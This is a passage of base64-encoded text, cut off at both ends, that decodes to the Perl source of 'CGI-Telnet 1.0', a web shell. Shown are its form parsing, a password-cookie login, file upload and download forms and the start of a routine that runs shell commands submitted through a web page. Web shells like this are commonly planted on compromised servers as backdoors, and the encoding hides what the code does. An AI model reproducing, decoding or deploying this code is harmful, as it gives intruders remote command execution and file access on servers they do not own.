ZpbGVkYXRhJ30uCiMgT3RoZXIgdmFyaWFibGVzIGNhbiBiZSBhY2Nlc3NlZCB1c2luZyAkaW57J3Zhcid9LCB3aGVyZSB2YXIgaXMgdGhlIG5hbWUgb2YKIyB0aGUgdmFyaWFibGUuIE5vdGU6IE1vc3Qgb2YgdGhlIGNvZGUgaW4gdGhpcyBmdW5jdGlvbiBpcyB0YWtlbiBmcm9tIG90aGVyIENHSQojIHNjcmlwdHMuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFJlYWRQYXJzZSAKewoJbG9jYWwgKCppbikgPSBAXyBpZiBAXzsKCWxvY2FsICgkaSwgJGxvYywgJGtleSwgJHZhbCk7CgkKCSRNdWx0aXBhcnRGb3JtRGF0YSA9ICRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvOwoKCWlmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIkdFVCIpCgl7CgkJJGluID0gJEVOVnsnUVVFUllfU1RSSU5HJ307Cgl9CgllbHNpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJQT1NUIikKCXsKCQliaW5tb2RlKFNURElOKSBpZiAkTXVsdGlwYXJ0Rm9ybURhdGEgJiAkV2luTlQ7CgkJcmVhZChTVERJTiwgJGluLCAkRU5WeydDT05URU5UX0xFTkdUSCd9KTsKCX0KCgkjIGhhbmRsZSBmaWxlIHVwbG9hZCBkYXRhCglpZigkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLykKCXsKCQkkQm91bmRhcnkgPSAnLS0nLiQxOyAjIHBsZWFzZSByZWZlciB0byBSRkMxODY3IAoJCUBsaXN0ID0gc3BsaXQoLyRCb3VuZGFyeS8sICRpbik7IAoJCSRIZWFkZXJCb2R5ID0gJGxpc3RbMV07CgkJJEhlYWRlckJvZHkgPX4gL1xyXG5cclxufFxuXG4vOwoJCSRIZWFkZXIgPSAkYDsKCQkkQm9keSA9ICQnOwogCQkkQm9keSA9fiBzL1xyXG4kLy87ICMgdGhlIGxhc3QgXHJcbiB3YXMgcHV0IGluIGJ5IE5ldHNjYXBlCgkJJGlueydmaWxlZGF0YSd9ID0gJEJvZHk7CgkJJEhlYWRlciA9fiAvZmlsZW5hbWU9XCIoLispXCIvOyAKCQkkaW57J2YnfSA9ICQxOyAKCQkkaW57J2YnfSA9fiBzL1wiLy9nOwoJCSRpbnsnZid9ID1+IHMvXHMvL2c7CgoJCSMgcGFyc2UgdHJhaWxlcgoJCWZvcigkaT0yOyAkbGlzdFskaV07ICRpKyspCgkJeyAKCQkJJGxpc3RbJGldID1+IHMvXi4rbmFtZT0kLy87CgkJCSRsaXN0WyRpXSA9fiAvXCIoXHcrKVwiLzsKCQkJJGtleSA9ICQxOwoJCQkkdmFsID0gJCc7CgkJCSR2YWwgPX4gcy8oXihcclxuXHJcbnxcblxuKSl8KFxyXG4kfFxuJCkvL2c7CgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7CgkJCSRpbnska2V5fSA9ICR2YWw7IAoJCX0KCX0KCWVsc2UgIyBzdGFuZGFyZCBwb3N0IGRhdGEgKHVybCBlbmNvZGVkLCBub3QgbXVsdGlwYXJ0KQoJewoJCUBpbiA9IHNwbGl0KC8mLywgJGluKTsKCQlmb3JlYWNoICRpICgwIC4uICQjaW4pCgkJewoJCQkkaW5bJGldID1+IHMvXCsvIC9nOwoJCQkoJGtleSwgJHZhbCkgPSBzcGxpdCgvPS8sICRpblskaV0sIDIpOwoJCQkka2V5ID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOwoJCQkkdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOwoJCQkkaW57JGtleX0gLj0gIlwwIiBpZiAoZGVmaW5lZCgkaW57JGtleX0pKTsKCQkJJGlueyRrZXl9IC49ICR2YWw7CgkJfQoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBIVE1MIFBhZ2UgSGVhZGVyCiMgQXJndW1lbnQgMTogRm9ybSBpdGVtIG5hbWUgdG8gd2hpY2ggZm9jdXMgc2hvdWxkIGJlIHNldAojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludFBhZ2VIZWFkZXIKewoJJEVuY29kZWRDdXJyZW50RGlyID0gJEN1cnJlbnREaXI7CgkkRW5jb2RlZEN1cnJlbnREaXIgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOwoJcHJpbnQgIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sXG5cbiI7CglwcmludCA8PEVORDsKPGh0bWw+CjxoZWFkPgo8dGl0bGU+Q0dJLVRlbG5ldCBWZXJzaW9uIDEuMDwvdGl0bGU+CiRIdG1sTWV0YUhlYWRlcgo8L2hlYWQ+Cjxib2R5IG9uTG9hZD0iZG9jdW1lbnQuZi5AXy5mb2N1cygpIiBiZ2NvbG9yPSIjMDAwMDAwIiB0b3BtYXJnaW49IjAiIGxlZnRtYXJnaW49IjAiIG1hcmdpbndpZHRoPSIwIiBtYXJnaW5oZWlnaHQ9IjAiPgo8dGFibGUgYm9yZGVyPSIxIiB3aWR0aD0iMTAwJSIgY2VsbHNwYWNpbmc9IjAiIGNlbGxwYWRkaW5nPSIyIj4KPHRyPgo8dGQgYmdjb2xvcj0iI0MyQkZBNSIgYm9yZGVyY29sb3I9IiMwMDAwODAiIGFsaWduPSJjZW50ZXIiPgo8Yj48Zm9udCBjb2xvcj0iIzAwMDA4MCIgc2l6ZT0iMiI+IzwvZm9udD48L2I+PC90ZD4KPHRkIGJnY29sb3I9IiMwMDAwODAiPjxmb250IGZhY2U9IlZlcmRhbmEiIHNpemU9IjIiIGNvbG9yPSIjRkZGRkZGIj48Yj5DR0ktVGVsbmV0IFZlcnNpb24gMS4wIC0gQ29ubmVjdGVkIHRvICRTZXJ2ZXJOYW1lPC9iPjwvZm9udD48L3RkPgo8L3RyPgo8dHI+Cjx0ZCBjb2xzcGFuPSIyIiBiZ2NvbG9yPSIjQzJCRkE1Ij48Zm9udCBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj4KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9dXBsb2FkJmQ9JEVuY29kZWRDdXJyZW50RGlyIj5VcGxvYWQgRmlsZTwvYT4gfCAKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPkRvd25sb2FkIEZpbGU8L2E+IHwKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9bG9nb3V0Ij5EaXNjb25uZWN0PC9hPiB8CjxhIGhyZWY9Imh0dHA6Ly93d3cucm9oaXRhYi5jb20vY2dpc2NyaXB0cy9jZ2l0ZWxuZXQuaHRtbCI+SGVscDwvYT4KPC9mb250PjwvdGQ+CjwvdHI+CjwvdGFibGU+Cjxmb250IGNvbG9yPSIjQzBDMEMwIiBzaXplPSIzIj4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIExvZ2luIFNjcmVlbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luU2NyZWVuCnsKCSRNZXNzYWdlID0gcSQ8cHJlPjxmb250IGNvbG9yPSIjNjY5OTk5Ij4gX19fX18gIF9fX19fICBfX19fXyAgICAgICAgICBfX19fXyAgICAgICAgXyAgICAgICAgICAgICAgIF8KLyAgX18gXHwgIF9fIFx8XyAgIF98ICAgICAgICB8XyAgIF98ICAgICAgfCB8ICAgICAgICAgICAgIHwgfAp8IC8gIFwvfCB8ICBcLyAgfCB8ICAgX19fX19fICAgfCB8ICAgIF9fXyB8IHwgXyBfXyAgICBfX18gfCB8Xwp8IHwgICAgfCB8IF9fICAgfCB8ICB8X19fX19ffCAgfCB8ICAgLyBfIFx8IHx8ICdfIFwgIC8gXyBcfCBfX3wKfCBcX18vXHwgfF9cIFwgX3wgfF8gICAgICAgICAgIHwgfCAgfCAgX18vfCB8fCB8IHwgfHwgIF9fL3wgfF8KIFxfX19fLyBcX19fXy8gXF9fXy8gICAgICAgICAgIFxfLyAgIFxfX198fF98fF98IHxffCBcX19ffCBcX198IDEuMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAo8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPiAgICAgICAgICAgICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgPC9mb250Pjxmb250IGNvbG9yPSIjQUU4MzAwIj7CqSAyMDAxLCBSb2hpdGFiIEJhdHJhPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj4KICAgICAgICAgICAgICAgICAgIC4tJnF1b3Q7ICAgICAgJnF1b3Q7LS4KICAgICAgICAgICAgICAgICAgLyAgICAgICAgICAgIFwKICAgICAgICAgICAgICAgICB8ICAgICAgICAgICAgICB8CiAgICAgICAgICAgICAgICAgfCwgIC4tLiAgLi0uICAsfAogICAgICAgICAgICAgICAgIHwgKShfby8gIFxvXykoIHwKICAgICAgICAgICAgICAgICB8LyAgICAgL1wgICAgIFx8CiAgICAgICAoQF8gICAgICAgKF8gICAgIF5eICAgICBfKQogIF8gICAgICkgXDwvZm9udD48Zm9udCBjb2xvcj0iIzgwODA4MCI+X19fX19fXzwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+XDwvZm9udD48Zm9udCBjb2xvcj0iIzgwODA4MCI+X188L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPnxJSUlJSUl8PC9mb250Pjxmb250IGNvbG9yPSIjODA4MDgwIj5fXzwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+LzwvZm9udD48Zm9udCBjb2xvcj0iIzgwODA4MCI+X19fX19fX19fX19fX19fX19fX19fX18KPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj4gKF8pPC9mb250Pjxmb250IGNvbG9yPSIjODA4MDgwIj5AOEA4PC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj57fTwvZm9udD48Zm9udCBjb2xvcj0iIzgwODA4MCI+Jmx0O19fX19fX19fPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj58LVxJSUlJSUkvLXw8L2ZvbnQ+PGZvbnQgY29sb3I9IiM4MDgwODAiPl9fX19fX19fX19fX19fX19fX19fX19fXyZndDs8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPgogICAgICAgIClfLyAgICAgICAgXCAgICAgICAgICAvIAogICAgICAgKEAgICAgICAgICAgIGAtLS0tLS0tLWAKICAgICAgICAgICAgIDwvZm9udD48Zm9udCBjb2xvcj0iI0FFODMwMCI+VyBBIFIgTiBJIE4gRzogUHJpdmF0ZSBTZXJ2ZXI8L2ZvbnQ+PC9wcmU+CiQ7CiMnCglwcmludCA8PEVORDsKPGNvZGU+ClRyeWluZyAkU2VydmVyTmFtZS4uLjxicj4KQ29ubmVjdGVkIHRvICRTZXJ2ZXJOYW1lPGJyPgpFc2NhcGUgY2hhcmFjdGVyIGlzIF5dCjxjb2RlPiRNZXNzYWdlCkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBtZXNzYWdlIHRoYXQgaW5mb3JtcyB0aGUgdXNlciBvZiBhIGZhaWxlZCBsb2dpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luRmFpbGVkTWVzc2FnZQp7CglwcmludCA8PEVORDsKPGNvZGU+Cjxicj5sb2dpbjogYWRtaW48YnI+CnBhc3N3b3JkOjxicj4KTG9naW4gaW5jb3JyZWN0PGJyPjxicj4KPC9jb2RlPgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIGZvciBsb2dnaW5nIGluCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50TG9naW5Gb3JtCnsKCXByaW50IDw8RU5EOwo8Y29kZT4KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJsb2dpbiI+CmxvZ2luOiBhZG1pbjxicj4KcGFzc3dvcmQ6PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwIj4KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4KPC9mb3JtPgo8L2NvZGU+CkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBmb290ZXIgZm9yIHRoZSBIVE1MIFBhZ2UKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUHJpbnRQYWdlRm9vdGVyCnsKCXByaW50ICI8L2ZvbnQ+PC9ib2R5PjwvaHRtbD4iOwp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUmV0cmVpdmVzIHRoZSB2YWx1ZXMgb2YgYWxsIGNvb2tpZXMuIFRoZSBjb29raWVzIGNhbiBiZSBhY2Nlc3NlcyB1c2luZyB0aGUKIyB2YXJpYWJsZSAkQ29va2llc3snJ30KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgR2V0Q29va2llcwp7CglAaHR0cGNvb2tpZXMgPSBzcGxpdCgvOyAvLCRFTlZ7J0hUVFBfQ09PS0lFJ30pOwoJZm9yZWFjaCAkY29va2llKEBodHRwY29va2llcykKCXsKCQkoJGlkLCAkdmFsKSA9IHNwbGl0KC89LywgJGNvb2tpZSk7CgkJJENvb2tpZXN7JGlkfSA9ICR2YWw7Cgl9Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIHNjcmVlbiB3aGVuIHRoZSB1c2VyIGxvZ3Mgb3V0CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50TG9nb3V0U2NyZWVuCnsKCXByaW50ICI8Y29kZT5Db25uZWN0aW9uIGNsb3NlZCBieSBmb3JlaWduIGhvc3QuPGJyPjxicj48L2NvZGU+IjsKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIExvZ3Mgb3V0IHRoZSB1c2VyIGFuZCBhbGxvd3MgdGhlIHVzZXIgdG8gbG9naW4gYWdhaW4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUGVyZm9ybUxvZ291dAp7CglwcmludCAiU2V0LUNvb2tpZTogU0FWRURQV0Q9O1xuIjsgIyByZW1vdmUgcGFzc3dvcmQgY29va2llCgkmUHJpbnRQYWdlSGVhZGVyKCJwIik7CgkmUHJpbnRMb2dvdXRTY3JlZW47CgkmUHJpbnRMb2dpblNjcmVlbjsKCSZQcmludExvZ2luRm9ybTsKCSZQcmludFBhZ2VGb290ZXI7Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB0byBsb2dpbiB0aGUgdXNlci4gSWYgdGhlIHBhc3N3b3JkIG1hdGNoZXMsIGl0CiMgZGlzcGxheXMgYSBwYWdlIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHJ1biBjb21tYW5kcy4gSWYgdGhlIHBhc3N3b3JkIGRvZW5zJ3QKIyBtYXRjaCBvciBpZiBubyBwYXNzd29yZCBpcyBlbnRlcmVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIKIyB0byBsb2dpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQZXJmb3JtTG9naW4gCnsKCWlmKCRMb2dpblBhc3N3b3JkIGVxICRQYXNzd29yZCkgIyBwYXNzd29yZCBtYXRjaGVkCgl7CgkJcHJpbnQgIlNldC1Db29raWU6IFNBVkVEUFdEPSRMb2dpblBhc3N3b3JkO1xuIjsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07CgkJJlByaW50UGFnZUZvb3RlcjsKCX0KCWVsc2UgIyBwYXNzd29yZCBkaWRuJ3QgbWF0Y2gKCXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJwIik7CgkJJlByaW50TG9naW5TY3JlZW47CgkJaWYoJExvZ2luUGFzc3dvcmQgbmUgIiIpICMgc29tZSBwYXNzd29yZCB3YXMgZW50ZXJlZAoJCXsKCQkJJlByaW50TG9naW5GYWlsZWRNZXNzYWdlOwoJCX0KCQkmUHJpbnRMb2dpbkZvcm07CgkJJlByaW50UGFnZUZvb3RlcjsKCX0KfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGNvbW1hbmRzCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50Q29tbWFuZExpbmVJbnB1dEZvcm0KewoJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7CglwcmludCA8PEVORDsKPGNvZGU+Cjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFuZCI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+CiRQcm9tcHQKPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImMiPgo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRW50ZXIiPgo8L2Zvcm0+CjwvY29kZT4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBkb3dubG9hZCBmaWxlcwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludEZpbGVEb3dubG9hZEZvcm0KewoJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7CglwcmludCA8PEVORDsKPGNvZGU+Cjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iZG93bmxvYWQiPgokUHJvbXB0IGRvd25sb2FkPGJyPjxicj4KRmlsZW5hbWU6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4KRG93bmxvYWQ6IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+CjwvZm9ybT4KPC9jb2RlPgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHVwbG9hZCBmaWxlcwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludEZpbGVVcGxvYWRGb3JtCnsKCSRQcm9tcHQgPSAkV2luTlQgPyAiJEN1cnJlbnREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkQ3VycmVudERpcl1cJCAiOwoJcHJpbnQgPDxFTkQ7Cjxjb2RlPgo8Zm9ybSBuYW1lPSJmIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4KJFByb21wdCB1cGxvYWQ8YnI+PGJyPgpGaWxlbmFtZTogPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImYiIHNpemU9IjM1Ij48YnI+PGJyPgpPcHRpb25zOiAmbmJzcDs8aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Im8iIHZhbHVlPSJvdmVyd3JpdGUiPgpPdmVyd3JpdGUgaWYgaXQgRXhpc3RzPGJyPjxicj4KVXBsb2FkOiZuYnNwOyZuYnNwOyZuYnNwOzxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJ1cGxvYWQiPgo8L2Zvcm0+CjwvY29kZT4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB0aW1lb3V0IGZvciBhIGNvbW1hbmQgZXhwaXJlcy4gV2UgbmVlZCB0bwojIHRlcm1pbmF0ZSB0aGUgc2NyaXB0IGltbWVkaWF0ZWx5LiBUaGlzIGZ1bmN0aW9uIGlzIHZhbGlkIG9ubHkgb24gVW5peC4gSXQgaXMKIyBuZXZlciBjYWxsZWQgd2hlbiB0aGUgc2NyaXB0IGlzIHJ1bm5pbmcgb24gTlQuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIENvbW1hbmRUaW1lb3V0CnsKCWlmKCEkV2luTlQpCgl7CgkJYWxhcm0oMCk7CgkJcHJpbnQgPDxFTkQ7CjwveG1wPgo8Y29kZT4KQ29tbWFuZCBleGNlZWRlZCBtYXhpbXVtIHRpbWUgb2YgJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gc2Vjb25kKHMpLgo8YnI+S2lsbGVkIGl0IQo8Y29kZT4KRU5ECgkJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07CgkJJlByaW50UGFnZUZvb3RlcjsKCQlleGl0OwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gZXhlY3V0ZSBjb21tYW5kcy4gSXQgZGlzcGxheXMgdGhlIG91dHB1dCBvZiB0aGUKIyBjb21tYW5kIGFuZCBhbGxvd3MgdGhlIHVzZXIgdG8gZW50ZXIgYW5vdGhlciBjb21tYW5kLiBUaGUgY2hhbmdlIGRpcmVjdG9yeQojIGNvbW1hbmQgaXMgaGFuZGxlZCBkaWZmZXJlbnRseS4gSW4gdGhpcyBjYXNlLCB0aGUgbmV3IGRpcmVjdG9yeSBpcyBzdG9yZWQgaW4KIyBhbiBpbnRlcm5hbCB2YXJpYWJsZSBhbmQgaXMgdXNlZCBlYWNoIHRpbWUgYSBjb21tYW5kIGhhcyB0byBiZSBleGVjdXRlZC4gVGhlCiMgb3V0cHV0IG9mIHRoZSBjaGFuZ2UgZGlyZWN0b3J5IGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZCB0byB0aGUgdXNlcnMKIyB0aGVyZWZvcmUgZXJyb3IgbWVzc2FnZXMgY2Fubm90IGJlIGRpc3BsYXllZC4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgRXhlY3V0ZUNvbW1hbmQKewoJaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqY2RccysoLispLykgIyBpdCBpcyBhIGNoYW5nZSBkaXIgY29tbWFuZAoJewoJCSMgd2UgY2hhbmdlIHRoZSBkaXJlY3RvcnkgaW50ZXJuYWxseS4gVGhlIG91dHB1dCBvZiB0aGUKCQkjIGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZC4KCQkKCQkkT2xkRGlyID0gJEN1cnJlbnREaXI7CgkJJENvbW1hbmQgPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiJjZCAkMSIuJENtZFNlcC4kQ21kUHdkOwoJCWNob3AoJEN1cnJlbnREaXIgPSBgJENvbW1hbmRgKTsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJJFByb21wdCA9ICRXaW5OVCA/ICIkT2xkRGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJE9sZERpcl1cJCAiOwoJCXByaW50ICI8Y29kZT4kUHJvbXB0ICRSdW5Db21tYW5kPC9jb2RlPiI7Cgl9CgllbHNlICMgc29tZSBvdGhlciBjb21tYW5kLCBkaXNwbGF5IHRoZSBvdXRwdXQKCXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJJFByb21wdCA9ICRXaW5OVCA/ICIk